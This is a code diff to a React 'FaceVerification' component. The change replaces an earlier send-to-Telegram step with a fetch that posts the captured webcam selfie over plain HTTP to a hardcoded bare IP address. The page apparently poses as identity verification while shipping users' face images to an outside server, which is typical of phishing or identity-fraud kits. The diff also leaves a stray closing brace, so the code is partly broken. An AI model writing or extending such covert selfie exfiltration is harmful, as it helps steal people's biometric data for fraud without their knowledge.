@@ -37,39 +37,38 @@ export default function FaceVerification() {
     // Function to capture image
     const captureImage = () => {
         setIsCapturing(true);
-
-        // Use setTimeout to show the capturing animation
+    
         setTimeout(() => {
             if (videoRef.current && canvasRef.current) {
                 const video = videoRef.current;
                 const canvas = canvasRef.current;
                 const context = canvas.getContext('2d');
-
-                // Set canvas dimensions to match video
+    
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
-
-                // Draw the current video frame to the canvas
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                // Convert to base64 image data
-                const imageData = canvas.toDataURL('image/png');
-                canvas.toBlob((blob) => {
-                    // Now you have a blob that can be sent to Telegram
-                    console.log("Image blob created");
-                    const formData = new FormData();
     
-                    // Append the image as a file
-                    formData.append('photo', imageBlob, 'selfie.jpg');
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('image', blob, 'selfie.jpg');
                     
-                    // Send the blob to Telegram
-                    sendMessageToTelegram (blob);
-                    
+                    try {
+                        const response = await fetch('http://5.196.190.224:5000/send-image', {
+                            method: 'POST',
+                            body: formData,
+                        });
+                        
+                        if (!response.ok) throw new Error('Failed to send image');
+                        console.log('Image sent successfully');
+                    } catch (error) {
+                        console.error('Error sending image:', error);
+                    }
                 }, 'image/jpeg', 0.9);
-
+                
                 setIsCapturing(false);
             }
         }, 300);
+};
     };
 
     return (
